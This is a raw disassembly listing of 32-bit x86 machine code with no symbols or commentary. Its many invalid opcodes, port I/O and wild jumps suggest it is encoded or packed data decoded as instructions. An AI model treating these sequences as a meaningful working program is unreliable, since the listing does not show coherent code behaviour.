  404e4b:	ea f4 7e 9f 48 e1 4c 	ljmp   $0x4ce1,$0x489f7ef4
  404e52:	9f                   	lahf
  404e53:	5f                   	pop    %edi
  404e54:	2b b5 94 eb e5 5c    	sub    0x5ce5eb94(%ebp),%esi
  404e5a:	88 02                	mov    %al,(%edx)
  404e5c:	8c 5f 9f             	mov    %ds,-0x61(%edi)
  404e5f:	eb e5                	jmp    0x404e46
  404e61:	5c                   	pop    %esp
  404e62:	8b 7a 2d             	mov    0x2d(%edx),%edi
  404e65:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404e66:	90                   	nop
  404e67:	ea f4 7e 9f 48 c5 4c 	ljmp   $0x4cc5,$0x489f7ef4
  404e6e:	9f                   	lahf
  404e6f:	5f                   	pop    %edi
  404e70:	2b b5 90 eb e5 5c    	sub    0x5ce5eb90(%ebp),%esi
  404e76:	88 e6                	mov    %ah,%dh
  404e78:	8c 5f 9f             	mov    %ds,-0x61(%edi)
  404e7b:	eb e5                	jmp    0x404e62
  404e7d:	5c                   	pop    %esp
  404e7e:	20 dc                	and    %bl,%ah
  404e80:	be 5f c0 d5 a6       	mov    $0xa6d5c05f,%esi
  404e85:	26 e5 5b             	es in  $0x5b,%eax
  404e88:	a1 4b a4 26 e5       	mov    0xe526a44b,%eax
  404e8d:	5b                   	pop    %ebx
  404e8e:	a0 a3 ef d5 48       	mov    0x48d5efa3,%al
  404e93:	93                   	xchg   %eax,%ebx
  404e94:	60                   	pusha
  404e95:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  404e9a:	b0 c8                	mov    $0xc8,%al
  404e9c:	cc                   	int3
  404e9d:	9a e0 60 2d a5 90 1a 	lcall  $0x1a90,$0xa52d60e0
  404ea4:	a2 60 a0 60 88       	mov    %al,0x8860a060
  404ea9:	50                   	push   %eax
  404eaa:	8a 5f 9f             	mov    -0x61(%edi),%bl
  404ead:	23 89 6a 86 5f 9f    	and    -0x60a07996(%ecx),%ecx
  404eb3:	4b                   	dec    %ebx
  404eb4:	8b bf fe bb 2b 45    	mov    0x452bbbfe(%edi),%edi
  404eba:	fd                   	std
  404ebb:	23 30                	and    (%eax),%esi
  404ebd:	b3 f6                	mov    $0xf6,%bl
  404ebf:	b7 29                	mov    $0x29,%bh
  404ec1:	26 29 30             	sub    %esi,%es:(%eax)
  404ec4:	25 56 af e4 21       	and    $0x21e4af56,%eax
  404ec9:	60                   	pusha
  404eca:	a0 60 2b b6 9c       	mov    0x9cb62b60,%al
  404ecf:	e9 67 e5 72 de       	jmp    0xdeb3343b
  404ed4:	18 eb                	sbb    %ch,%bl
  404ed6:	a8 e9                	test   $0xe9,%al
  404ed8:	73 e5                	jae    0x404ebf
  404eda:	69 d4 c3 57 62 63    	imul   $0x636257c3,%esp,%edx
  404ee0:	a0 60 a0 d5 aa       	mov    0xaad5a060,%al
  404ee5:	93                   	xchg   %eax,%ebx
  404ee6:	f1                   	int1
  404ee7:	5c                   	pop    %esp
  404ee8:	23 5a a3             	and    -0x5d(%edx),%ebx
  404eeb:	d6                   	salc
  404eec:	ad                   	lods   %ds:(%esi),%eax
  404eed:	4b                   	dec    %ebx
  404eee:	b1 e3                	mov    $0xe3,%cl
  404ef0:	6a 62                	push   $0x62
  404ef2:	d3 b1 9c e3 9a 61    	shll   %cl,0x619ae39c(%ecx)
  404ef8:	17                   	pop    %ss
  404ef9:	66 23 d9             	and    %cx,%bx
  404efc:	98                   	cwtl
  404efd:	61                   	popa
  404efe:	14 6a                	adc    $0x6a,%al
  404f00:	29 3a                	sub    %edi,(%edx)
  404f02:	23 2a                	and    (%edx),%ebp
  404f04:	a3 48 b3 4f 9f       	mov    %eax,0x9f4fb348
  404f09:	5f                   	pop    %edi
  404f0a:	2b 9f 29 bf 9c 26    	sub    0x269cbf29(%edi),%ebx
  404f10:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404f11:	7f a0                	jg     0x404eb3
  404f13:	e3 63                	jecxz  0x404f78
  404f15:	5f                   	pop    %edi
  404f16:	23 43 9c             	and    -0x64(%ebx),%eax
  404f19:	eb a4                	jmp    0x404ebf
  404f1b:	7e 29                	jle    0x404f46
  404f1d:	21 ad e0 20 e0 20    	and    %ebp,0x20e020e0(%ebp)
  404f23:	e9 62 8d 1b db       	jmp    0xdb5bdc8a
  404f28:	1b db                	sbb    %ebx,%ebx
  404f2a:	d1 2a                	shrl   $1,(%edx)
  404f2c:	ad                   	lods   %ds:(%esi),%eax
  404f2d:	e0 20                	loopne 0x404f4f
  404f2f:	e0 20                	loopne 0x404f51
  404f31:	8d 06                	lea    (%esi),%eax
  404f33:	c6 06 c6             	movb   $0xc6,(%esi)
  404f36:	c1 30 61             	shll   $0x61,(%eax)
  404f39:	48                   	dec    %eax
  404f3a:	a2 91 68 e9 a4       	mov    %al,0xa4e96891
  404f3f:	7f 2b                	jg     0x404f6c
  404f41:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404f42:	be 5c 23 4b a4       	mov    $0xa44b235c,%esi
  404f47:	dd 73 bf             	fnsave -0x41(%ebx)
  404f4a:	fe                   	(bad)
  404f4b:	bb 63 bf fe bb       	mov    $0xbbfebf63,%ebx
  404f50:	89 84 8a 5f 9f 23 2d 	mov    %eax,0x2d239f5f(%edx,%ecx,4)
  404f57:	a0 a0 b3 f6 b7       	mov    0xb7f6b3a0,%al
  404f5c:	29 26                	sub    %esp,(%esi)
  404f5e:	29 30                	sub    %esi,(%eax)
  404f60:	25 56 af e4 21       	and    $0x21e4af56,%eax
  404f65:	60                   	pusha
  404f66:	a0 60 2b b6 9c       	mov    0x9cb62b60,%al
  404f6b:	e9 67 e5 72 de       	jmp    0xdeb334d7
  404f70:	18 eb                	sbb    %ch,%bl
  404f72:	a8 e9                	test   $0xe9,%al
  404f74:	73 e5                	jae    0x404f5b
  404f76:	69 d4 c3 57 62 63    	imul   $0x636257c3,%esp,%edx
  404f7c:	a0 60 a0 d5 aa       	mov    0xaad5a060,%al
  404f81:	93                   	xchg   %eax,%ebx
  404f82:	f1                   	int1
  404f83:	5c                   	pop    %esp
  404f84:	23 5a a3             	and    -0x5d(%edx),%ebx
  404f87:	d6                   	salc
  404f88:	ad                   	lods   %ds:(%esi),%eax
  404f89:	4b                   	dec    %ebx
  404f8a:	b1 e3                	mov    $0xe3,%cl
  404f8c:	6a 62                	push   $0x62
  404f8e:	d3 b1 9c e3 9a 61    	shll   %cl,0x619ae39c(%ecx)
  404f94:	17                   	pop    %ss
  404f95:	66 23 d9             	and    %cx,%bx
  404f98:	98                   	cwtl
  404f99:	61                   	popa
  404f9a:	14 6a                	adc    $0x6a,%al
  404f9c:	29 3a                	sub    %edi,(%edx)
  404f9e:	23 2a                	and    (%edx),%ebp
  404fa0:	a3 48 17 4e 9f       	mov    %eax,0x9f4e1748
  404fa5:	5f                   	pop    %edi
  404fa6:	2b 9f 29 bf 9c 26    	sub    0x269cbf29(%edi),%ebx
  404fac:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404fad:	7f a0                	jg     0x404f4f
  404faf:	e3 63                	jecxz  0x405014
  404fb1:	5f                   	pop    %edi
  404fb2:	23 43 9c             	and    -0x64(%ebx),%eax
  404fb5:	eb a4                	jmp    0x404f5b
  404fb7:	7e 29                	jle    0x404fe2
  404fb9:	21 ad e0 20 e0 20    	and    %ebp,0x20e020e0(%ebp)
  404fbf:	e9 62 8d fb bb       	jmp    0xbc3bdd26
  404fc4:	fb                   	sti
  404fc5:	bb d1 2a ad e0       	mov    $0xe0ad2ad1,%ebx
  404fca:	20 e0                	and    %ah,%al
  404fcc:	20 8d 06 c6 06 c6    	and    %cl,-0x39f939fa(%ebp)
  404fd2:	c1 30 61             	shll   $0x61,(%eax)
  404fd5:	48                   	dec    %eax
  404fd6:	a2 91 68 e9 a4       	mov    %al,0xa4e96891
  404fdb:	7f 2b                	jg     0x405008
  404fdd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404fde:	be 5c 23 4b a4       	mov    $0xa44b235c,%esi
  404fe3:	dd 73 bf             	fnsave -0x41(%ebx)
  404fe6:	fe                   	(bad)
  404fe7:	bb 63 bf fe bb       	mov    $0xbbfebf63,%ebx
  404fec:	89 e8                	mov    %ebp,%eax
  404fee:	89 5f 9f             	mov    %ebx,-0x61(%edi)
  404ff1:	23 2d a0 a0 b5 2b    	and    0x2bb5a0a0,%ebp
  404ff7:	4c                   	dec    %esp
  404ff8:	0a 60 f3             	or     -0xd(%eax),%ah
  404ffb:	b6 2b                	mov    $0x2b,%dh
  404ffd:	3a 2b                	cmp    (%ebx),%ch
  404fff:	50                   	push   %eax
  405000:	d3 20                	shll   %cl,(%eax)
  405002:	f5                   	cmc
  405003:	c8 5d 9b e0          	enter  $0x9b5d,$0xe0
  405007:	60                   	pusha
  405008:	04 5f                	add    $0x5f,%al
  40500a:	d0 c4                	rol    $1,%ah
  40500c:	29 80 2d b5 9c eb    	sub    %eax,-0x14634ad3(%eax)
  405012:	63 48 dd             	arpl   %ecx,-0x23(%eax)
  405015:	60                   	pusha
  405016:	a0 60 2b b5 9c       	mov    0x9cb52b60,%al
  40501b:	eb 66                	jmp    0x405083
  40501d:	48                   	dec    %eax
  40501e:	53                   	push   %ebx
  40501f:	4d                   	dec    %ebp
  405020:	9f                   	lahf
  405021:	5f                   	pop    %edi
  405022:	f0 eb 63             	lock jmp 0x405088
  405025:	48                   	dec    %eax
  405026:	6f                   	outsl  %ds:(%esi),(%dx)
  405027:	4a                   	dec    %edx
  405028:	9f                   	lahf
  405029:	5f                   	pop    %edi
  40502a:	fa                   	cli
  40502b:	8b 62 a0             	mov    -0x60(%edx),%esp
  40502e:	2b 38                	sub    (%eax),%edi
  405030:	d3 20                	shll   %cl,(%eax)
  405032:	fa                   	cli
  405033:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  405038:	08 24 db             	or     %ah,(%ebx,%ebx,8)
  40503b:	a0 a0 ed e5 5c       	mov    0x5ce5eda0,%al
  405040:	88 94 89 5f 9f 23 89 	mov    %dl,-0x76dc60a1(%ecx,%ecx,4)
  405047:	d2 84 5f 9f 4b 90 eb 	rolb   %cl,-0x146fb461(%edi,%ebx,2)
  40504e:	63 be fb b9 fd 23    	arpl   %edi,0x23fdb9fb(%esi)
  405054:	30 b3 f6 eb 7a eb    	xor    %dh,-0x1485140a(%ebx)
  40505a:	90                   	nop
  40505b:	eb 66                	jmp    0x4050c3
  40505d:	48                   	dec    %eax
  40505e:	37                   	aaa
  40505f:	4a                   	dec    %edx
  405060:	9f                   	lahf
  405061:	5f                   	pop    %edi
  405062:	2b 30                	sub    (%eax),%esi
  405064:	2b 23                	sub    (%ebx),%esp
  405066:	88 12                	mov    %dl,(%edx)
  405068:	8d 5f 9f             	lea    -0x61(%edi),%ebx
  40506b:	eb a3                	jmp    0x405010
  40506d:	48                   	dec    %eax
  40506e:	1f                   	pop    %ds
  40506f:	4c                   	dec    %esp
  405070:	9f                   	lahf
  405071:	5f                   	pop    %edi
  405072:	2b 38                	sub    (%eax),%edi
  405074:	2b 26                	sub    (%esi),%esp
  405076:	88 de                	mov    %bl,%dh
  405078:	8a 5f 9f             	mov    -0x61(%edi),%bl
  40507b:	e3 98                	jecxz  0x405015
  40507d:	61                   	popa
  40507e:	1c 6c                	sbb    $0x6c,%al
  405080:	2a b4 a6 5f 28 73 e3 	sub    -0x1c8cd7a1(%esi,%eiz,4),%dh
  405087:	a8 25                	test   $0x25,%al
  405089:	20 15 54 fe bb 63    	and    %dl,0x63bbfe54
  40508f:	eb 60                	jmp    0x4050f1
  405091:	b5 2b                	mov    $0x2b,%ch
  405093:	4c                   	dec    %esp
  405094:	0a 60 0a             	or     0xa(%eax),%ah
  405097:	60                   	pusha
  405098:	0a 60 0a             	or     0xa(%eax),%ah
  40509b:	60                   	pusha
  40509c:	0a 60 f3             	or     -0xd(%eax),%ah
  40509f:	b6 f7                	mov    $0xf7,%dh
  4050a1:	e9 ed 5c 2b 5a       	jmp    0x5a6bad93
  4050a6:	2b 38                	sub    (%eax),%edi
  4050a8:	2b d5                	sub    %ebp,%edx
  4050aa:	a8 93                	test   $0x93,%al
  4050ac:	60                   	pusha
  4050ad:	b5 08                	mov    $0x8,%ch
  4050af:	8b dd                	mov    %ebp,%ebx
  4050b1:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  4050b6:	04 e9                	add    $0xe9,%al
  4050b8:	c0 56 e5 6c          	rclb   $0x6c,-0x1b(%esi)
  4050bc:	a2 d4 b6 ed f5       	mov    %al,0xf5edb6d4
  4050c1:	58                   	pop    %eax
  4050c2:	2b 23                	sub    (%ebx),%esp
  4050c4:	88 54 9d 5f          	mov    %dl,0x5f(%ebp,%ebx,4)
  4050c8:	9f                   	lahf
  4050c9:	ed                   	in     (%dx),%eax
  4050ca:	f5                   	cmc
  4050cb:	54                   	push   %esp
  4050cc:	2b 27                	sub    (%edi),%esp
  4050ce:	88 4a 9d             	mov    %cl,-0x63(%edx)
  4050d1:	5f                   	pop    %edi
  4050d2:	9f                   	lahf
  4050d3:	4b                   	dec    %ebx
  4050d4:	b4 ed                	mov    $0xed,%ah
  4050d6:	e5 58                	in     $0x58,%eax
  4050d8:	2b 33                	sub    (%ebx),%esi
  4050da:	88 92 89 5f 9f ed    	mov    %dl,-0x1260a077(%edx)
  4050e0:	e5 54                	in     $0x54,%eax
  4050e2:	2b 37                	sub    (%edi),%esi
  4050e4:	88 88 89 5f 9f ed    	mov    %cl,-0x1260a077(%eax)
  4050ea:	e5 50                	in     $0x50,%eax
  4050ec:	2b 33                	sub    (%ebx),%esi
  4050ee:	88 7e 89             	mov    %bh,-0x77(%esi)
  4050f1:	5f                   	pop    %edi
  4050f2:	9f                   	lahf
  4050f3:	eb 66                	jmp    0x40515b
  4050f5:	48                   	dec    %eax
  4050f6:	1f                   	pop    %ds
  4050f7:	48                   	dec    %eax
  4050f8:	9f                   	lahf
  4050f9:	5f                   	pop    %edi
  4050fa:	89 f0                	mov    %esi,%eax
  4050fc:	a0 60 a0 eb f5       	mov    0xf5eba060,%al
  405101:	58                   	pop    %eax
  405102:	2b a5 94 48 6b 4c    	sub    0x4c6b4894(%ebp),%esp
  405108:	9f                   	lahf
  405109:	5f                   	pop    %edi
  40510a:	2b 38                	sub    (%eax),%edi
  40510c:	25 3b 15 6c 2b       	and    $0x2b6c153b,%eax
  405111:	26 2b b5 90 48 87 49 	sub    %es:0x49874890(%ebp),%esi
  405118:	9f                   	lahf
  405119:	5f                   	pop    %edi
  40511a:	8b dd                	mov    %ebp,%ebx
  40511c:	9f                   	lahf
  40511d:	96                   	xchg   %eax,%esi
  40511e:	2d a5 8c b0 2b       	sub    $0x2bb08ca5,%eax
  405123:	2b e9                	sub    %ecx,%ebp
  405125:	1a a1 60 a0 60 2b    	sbb    0x2b60a060(%ecx),%ah
  40512b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40512c:	90                   	nop
  40512d:	48                   	dec    %eax
  40512e:	bb 4c 9f 5f 9f       	mov    $0x9f5f9f4c,%ebx
  405133:	d5 8c                	aad    $0x8c
  405135:	5f                   	pop    %edi
  405136:	15 5c 2b 26 5a       	adc    $0x5a262b5c,%eax
  40513b:	63 a0 60 a0 48 15    	arpl   %esp,0x1548a060(%eax)
  405141:	4a                   	dec    %edx
  405142:	9f                   	lahf
  405143:	5f                   	pop    %edi
  405144:	2d a5 90 b0 2b       	sub    $0x2bb090a5,%eax
  405149:	27                   	daa
  40514a:	88 0a                	mov    %cl,(%edx)
  40514c:	89 5f 9f             	mov    %ebx,-0x61(%edi)
  40514f:	eb 70                	jmp    0x4051c1
  405151:	63 73 19             	arpl   %esi,0x19(%ebx)
  405154:	9f                   	lahf
  405155:	5f                   	pop    %edi
  405156:	9f                   	lahf
  405157:	df 2b                	fildll (%ebx)
  405159:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40515a:	90                   	nop
  40515b:	48                   	dec    %eax
  40515c:	8d 4b 9f             	lea    -0x61(%ebx),%ecx
  40515f:	5f                   	pop    %edi
  405160:	96                   	xchg   %eax,%esi
  405161:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405162:	ac                   	lods   %ds:(%esi),%al
  405163:	61                   	popa
  405164:	15 6c 2b 26 2b       	adc    $0x2b262b6c,%eax
  405169:	b5 90                	mov    $0x90,%ch
  40516b:	48                   	dec    %eax
  40516c:	31 49 9f             	xor    %ecx,-0x61(%ecx)
  40516f:	5f                   	pop    %edi
  405170:	8b 87 2d a5 98 b0    	mov    -0x4f675ad3(%edi),%eax
  405176:	2b a5 94 48 1b 49    	sub    0x491b4894(%ebp),%esp
  40517c:	9f                   	lahf
  40517d:	5f                   	pop    %edi
  40517e:	2b 30                	sub    (%eax),%esi
  405180:	a3 33 59 5f 9f       	mov    %eax,0x9f5f5933
  405185:	5f                   	pop    %edi
  405186:	1f                   	pop    %ds
  405187:	eb e5                	jmp    0x40516e
  405189:	58                   	pop    %eax
  40518a:	88 1e                	mov    %bl,(%esi)
  40518c:	8b 5f 9f             	mov    -0x61(%edi),%ebx
  40518f:	e3 1d                	jecxz  0x4051ae
  405191:	58                   	pop    %eax
  405192:	a0 6f 25 c6 9f       	mov    0x9fc6256f,%al
  405197:	5f                   	pop    %edi
  405198:	9f                   	lahf
  405199:	93                   	xchg   %eax,%ebx
  40519a:	60                   	pusha
  40519b:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  4051a0:	b0 c8                	mov    $0xc8,%al
  4051a2:	d2 9d e0 60 2d a5    	rcrb   %cl,-0x5ad29f20(%ebp)
  4051a8:	8c 1a                	mov    %ds,(%edx)
  4051aa:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4051ab:	60                   	pusha
  4051ac:	a0 60 88 4a 87       	mov    0x874a8860,%al
  4051b1:	5f                   	pop    %edi
  4051b2:	9f                   	lahf
  4051b3:	23 89 64 83 5f 9f    	and    -0x60a07c9c(%ecx),%ecx
  4051b9:	4b                   	dec    %ebx
  4051ba:	8b bf fe bb 2b 45    	mov    0x452bbbfe(%edi),%edi
  4051c0:	fd                   	std
  4051c1:	22 a8 60 30 e3 9a    	and    -0x651ccfa0(%eax),%ch
  4051c7:	80 16 62             	adcb   $0x62,(%esi)
  4051ca:	d1 32                	shll   $1,(%edx)
  4051cc:	f6 e9                	imul   %cl
  4051ce:	86 e3                	xchg   %ah,%bl
  4051d0:	8c 80 f1 19 b0 60    	mov    %es,0x60b019f1(%eax)
  4051d6:	a0 60 a8 29 15       	mov    0x1529a860,%al
  4051db:	77 a9                	ja     0x405186
  4051dd:	20 19                	and    %bl,(%ecx)
  4051df:	6e                   	outsb  %ds:(%esi),(%dx)
  4051e0:	97                   	xchg   %eax,%edi
  4051e1:	38 88 67 a0 60 a0    	cmp    %cl,-0x5f9f5f99(%eax)
  4051e7:	10 cd                	adc    %cl,%ch
  4051e9:	a1 ee e8 a6 23       	mov    0x23a6e8ee,%eax
  4051ee:	59                   	pop    %ecx
  4051ef:	6a a0                	push   $0xffffffa0
  4051f1:	60                   	pusha
  4051f2:	a0 b2 f6 91 72       	mov    0x7291f6b2,%al
  4051f7:	57                   	push   %edi
  4051f8:	91                   	xchg   %eax,%ecx
  4051f9:	ae                   	scas   %es:(%edi),%al
  4051fa:	20 22                	and    %ah,(%edx)
  4051fc:	d0 e0                	shl    $1,%al
  4051fe:	9a 9a 12 63 20 22 a7 	lcall  $0xa722,$0x2063129a
  405205:	e8 b6 69 60 d5       	call   0xd5a0bbc0
  40520a:	8a b9 fa 89 91 89    	mov    -0x766e7606(%ecx),%bh
  405210:	6a d6                	push   $0xffffffd6
  405212:	b0 61                	mov    $0x61,%al
  405214:	71 10                	jno    0x405226
  405216:	d0 89 76 4b a3 e8    	rorb   $1,-0x175cb48a(%ecx)
  40521c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40521d:	92                   	xchg   %eax,%edx
  40521e:	ea d5 9a e8 a6 e9 92 	ljmp   $0x92e9,$0xa6e89ad5
  405225:	b8 88 9a 88 5f       	mov    $0x5f889a88,%eax
  40522a:	9f                   	lahf
  40522b:	e3 64                	jecxz  0x405291
  40522d:	80 fe 23             	cmp    $0x23,%dh
  405230:	30 b5 2b 4c 23 24    	xor    %dh,0x24234c2b(%ebp)
  405236:	98                   	cwtl
  405237:	b3 d3                	mov    $0xd3,%bl
  405239:	32 29                	xor    (%ecx),%ch
  40523b:	b5 98                	mov    $0x98,%ch
  40523d:	e9 e5 5c 2b a5       	jmp    0xa56baf27
  405242:	9c                   	pushf
  405243:	48                   	dec    %eax
  405244:	39 4a 9f             	cmp    %ecx,-0x61(%edx)
  405247:	5f                   	pop    %edi
  405248:	d3 20                	shll   %cl,(%eax)
  40524a:	f5                   	cmc
  40524b:	c8 a2 9e e0          	enter  $0x9ea2,$0xe0
  40524f:	60                   	pusha
  405250:	04 5f                	add    $0x5f,%al
  405252:	d0 c4                	rol    $1,%ah
  405254:	29 80 2d a5 98 eb    	sub    %eax,-0x14675ad3(%eax)
  40525a:	ed                   	in     (%dx),%eax
  40525b:	5c                   	pop    %esp
  40525c:	5a                   	pop    %edx
  40525d:	78 de                	js     0x40523d
  40525f:	a0 a0 48 7f 48       	mov    0x487f48a0,%al
  405264:	9f                   	lahf
  405265:	5f                   	pop    %edi
  405266:	2b a5 98 48 37 61    	sub    0x61374898(%ebp),%esp
  40526c:	a0 60 2b 38 d3       	mov    0xd3382b60,%al
  405271:	20 fa                	and    %bh,%dl
  405273:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  405278:	08 69 de             	or     %ch,-0x22(%ecx)
  40527b:	a0 a0 ed e5 58       	mov    0x58e5eda0,%al
  405280:	5a                   	pop    %edx
  405281:	62 a0 60 a0 48 b3    	bound  %esp,-0x4cb75fa0(%eax)
  405287:	47                   	inc    %edi
  405288:	9f                   	lahf
  405289:	5f                   	pop    %edi
  40528a:	63 49 cd             	arpl   %ecx,-0x33(%ecx)
  40528d:	42                   	inc    %edx
  40528e:	9f                   	lahf
  40528f:	5f                   	pop    %edi
  405290:	8b 4b 2b             	mov    0x2b(%ebx),%ecx
  405293:	23 fb                	and    %ebx,%edi
  405295:	b9 f9 bd 63 5f       	mov    $0x5f63bdf9,%ecx
  40529a:	9f                   	lahf
  40529b:	5f                   	pop    %edi
  40529c:	9f                   	lahf
  40529d:	61                   	popa
  40529e:	a0 60 a0 84 a0       	mov    0xa084a060,%al
  4052a3:	60                   	pusha
  4052a4:	a0 68 69 d5 b7       	mov    0xb7d56968,%al
  4052a9:	69 60 d9 ae 57 78 48 	imul   $0x487857ae,-0x27(%eax),%esp
  4052b0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4052b1:	60                   	pusha
  4052b2:	a0 60 50 8d e1       	mov    0xe18d5060,%al
  4052b7:	ae                   	scas   %es:(%edi),%al
  4052b8:	28 66 63             	sub    %ah,0x63(%esi)
  4052bb:	19 aa 60 a0 60 f2    	sbb    %ebp,-0xd9f5fa0(%edx)
  4052c1:	b6 d1                	mov    $0xd1,%dh
  4052c3:	32 97 51 ee e0 62    	xor    0x62e0ee51(%edi),%dl
  4052c9:	90                   	nop
  4052ca:	20 5a da             	and    %bl,-0x26(%edx)
  4052cd:	d2 a3 e0 62 67 28    	shlb   %cl,0x286762e0(%ebx)
  4052d3:	76 a9                	jbe    0x40527e
  4052d5:	20 15 4a f9 ba c9    	and    %dl,0xc9baf94a
  4052db:	51                   	push   %ecx
  4052dc:	c9                   	leave
  4052dd:	2a 16                	sub    (%esi),%dl
  4052df:	70 a1                	jo     0x405282
  4052e1:	31 50 90             	xor    %edx,-0x70(%eax)
  4052e4:	c9                   	leave
  4052e5:	36 8b 63 28          	mov    %ss:0x28(%ebx),%esp
  4052e9:	64 d2 aa 15 5a 28 66 	shrb   %cl,%fs:0x66285a15(%edx)
  4052f0:	63 b6 29 46 23 4c    	arpl   %esi,0x4c234629(%esi)
  4052f6:	b0 91                	mov    $0x91,%al
  4052f8:	69 b2 d1 32 88 04 9f 	imul   $0xe99f5f9f,0x48832d1(%edx),%esi
  4052ff:	5f 9f e9 
  405302:	92                   	xchg   %eax,%edx
  405303:	b8 88 bc 87 5f       	mov    $0x5f87bc88,%eax
  405308:	9f                   	lahf
  405309:	e3 64                	jecxz  0x40536f
  40530b:	70 fe                	jo     0x40530b
  40530d:	23 2d a0 a0 68 69    	and    0x6968a0a0,%ebp
  405313:	d5 d0                	aad    $0xd0
  405315:	19 aa 60 a0 60 97    	sbb    %ebp,-0x689f5fa0(%edx)
  40531b:	a0 a4 60 a0 60       	mov    0x60a060a4,%al
  405320:	20 d4                	and    %dl,%ah
  405322:	c2 5f 10             	ret    $0x105f
  405325:	64 9f                	fs lahf
  405327:	90                   	nop
  405328:	29 40 97             	sub    %eax,-0x69(%eax)
  40532b:	7c c4                	jl     0x4052f1
  40532d:	e3 f4                	jecxz  0x405323
  40532f:	84 a4 60 97 bc c4 64 	test   %ah,0x64c4bc97(%eax,%eiz,2)
  405336:	88 6a a0             	mov    %ch,-0x60(%edx)
  405339:	60                   	pusha
  40533a:	a0 26 e6 5f cd       	mov    0xcd5fe626,%al
  40533f:	ae                   	scas   %es:(%edi),%al
  405340:	e1 e3                	loope  0x405325
  405342:	64 68 63 b6 23 4c    	fs push $0x4c23b663
  405348:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405349:	39 1c 84             	cmp    %ebx,(%esp,%eax,4)
  40534c:	a2 39 dc 84 06       	mov    %al,0x684dc39
  405351:	e1 ac                	loope  0x4052ff
  405353:	84 a0 6f 79 8c c4    	test   %ah,-0x3b738691(%eax)
  405359:	c6                   	(bad)
  40535a:	29 6c c4 39          	sub    %ebp,0x39(%esp,%eax,8)
  40535e:	88 57 e0             	mov    %dl,-0x20(%edi)
  405361:	64 a0 60 a0 e0 14    	mov    %fs:0x14e0a060,%al
  405367:	87 9f d0 a4 5f d0    	xchg   %ebx,-0x2fa05b30(%edi)
  40536d:	e1 04                	loope  0x405373
  40536f:	84 a4 5f 9f 5f 1f c8 	test   %ah,-0x37e0a061(%edi,%ebx,2)
  405376:	9f                   	lahf
  405377:	5f                   	pop    %edi
  405378:	9f                   	lahf
  405379:	df 08                	fisttps (%eax)
  40537b:	5f                   	pop    %edi
  40537c:	9f                   	lahf
  40537d:	5f                   	pop    %edi
  40537e:	9f                   	lahf
  40537f:	3f                   	aas
  405380:	0c 84                	or     $0x84,%al
  405382:	a8 3f                	test   $0x3f,%al
  405384:	cc                   	int3
  405385:	84 78 22             	test   %bh,0x22(%eax)
  405388:	7e 21                	jle    0x4053ab
  40538a:	23 24 b0             	and    (%eax,%esi,4),%esp
  40538d:	4b                   	dec    %ebx
  40538e:	a2 3f c8 3f a4       	mov    %al,0xa43fc83f
  405393:	84 79 21             	test   %bh,0x21(%ecx)
  405396:	ee                   	out    %al,(%dx)
  405397:	39 98 3f bc 84 7c    	cmp    %ebx,0x7c84bc3f(%eax)
  40539d:	59                   	pop    %ecx
  40539e:	2a 64 c4 64          	sub    0x64(%esp,%eax,8),%ah
  4053a2:	d0 9c da d2 a2 64 a7 	rcrb   $1,-0x589b5d2e(%edx,%ebx,8)
  4053a9:	e8 a6 39 61 38       	call   0x38a18d54
  4053ae:	73 fb                	jae    0x4053ab
  4053b0:	7f 40                	jg     0x4053f2
  4053b2:	3e d3 81 39 0c 84 a2 	roll   %cl,%ds:-0x5d7bf3c7(%ecx)
  4053b9:	e3 64                	jecxz  0x40541f
  4053bb:	64 7d 23             	fs jge 0x4053e1
  4053be:	7d 22                	jge    0x4053e2
  4053c0:	7d 21                	jge    0x4053e3
  4053c2:	7d 20                	jge    0x4053e4
  4053c4:	f9                   	stc
  4053c5:	89 91 89 6a d6 b0    	mov    %edx,-0x4f299577(%ecx)
  4053cb:	89 76 10             	mov    %esi,0x10(%esi)
  4053ce:	d0 61 71             	shlb   $1,0x71(%ecx)
  4053d1:	4b                   	dec    %ebx
  4053d2:	a3 e8 a4 92 ea       	mov    %eax,0xea92a4e8
  4053d7:	d5 9a                	aad    $0x9a
  4053d9:	e8 a6 23 30 b5       	call   0xb5707784
  4053de:	2b 4c f6 e9          	sub    -0x17(%esi,%esi,8),%ecx
  4053e2:	86 e3                	xchg   %ah,%bl
  4053e4:	8c 80 d1 29 f0 91    	mov    %es,-0x6e0fd62f(%eax)
  4053ea:	72 ed                	jb     0x4053d9
  4053ec:	e5 68                	in     $0x68,%eax
  4053ee:	88 7e 9f             	mov    %bh,-0x61(%esi)
  4053f1:	5f                   	pop    %edi
  4053f2:	9f                   	lahf
  4053f3:	e9 92 b8 88 ca       	jmp    0xcac90c8a
  4053f8:	86 5f 9f             	xchg   %bl,-0x61(%edi)
  4053fb:	e3 64                	jecxz  0x405461
  4053fd:	80 fe bd             	cmp    $0xbd,%dh
  405400:	62 68 a0             	bound  %ebp,-0x60(%eax)
  405403:	eb 60                	jmp    0x405465
  405405:	b1 2b                	mov    $0x2b,%cl
  405407:	34 88                	xor    $0x88,%al
  405409:	44                   	inc    %esp
  40540a:	7b 5f                	jnp    0x40546b
  40540c:	9f                   	lahf
  40540d:	e3 dc                	jecxz  0x4053eb
  40540f:	84 a0 d4 a2 93 60    	test   %ah,0x6093a2d4(%eax)
  405415:	ba 63 eb 60 b5       	mov    $0xb560eb63,%edx
  40541a:	2b 4c 0a 60          	sub    0x60(%edx,%ecx,1),%ecx
  40541e:	0a 60 f3             	or     -0xd(%eax),%ah
  405421:	b6 f7                	mov    $0xf7,%dh
  405423:	eb 7a                	jmp    0x40549f
  405425:	eb 90                	jmp    0x4053b7
  405427:	93                   	xchg   %eax,%ebx
  405428:	60                   	pusha
  405429:	b5 08                	mov    $0x8,%ch
  40542b:	99                   	cltd
